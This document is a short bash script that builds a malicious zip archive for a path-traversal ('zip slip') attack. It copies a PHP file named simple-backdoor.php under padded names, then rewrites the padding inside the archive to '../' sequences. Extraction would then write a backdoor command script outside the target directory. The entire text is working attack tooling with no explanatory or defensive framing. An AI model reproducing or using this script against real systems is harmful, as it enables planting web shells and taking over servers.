#!/bin/bash

rm cmd.zip

for i in `seq 1 4`
do 
    FILE=$FILE"xxA"
    cp simple-backdoor.php $FILE"cmd.php"
done

for i in `seq 1 100`
do
    echo "bullsh1t" >> textfile.txt
done

zip cmd.zip xx*.php textfile.txt

sed -i 's/xxA/..\//g' cmd.zip

rm xx*.php
rm textfile.txt
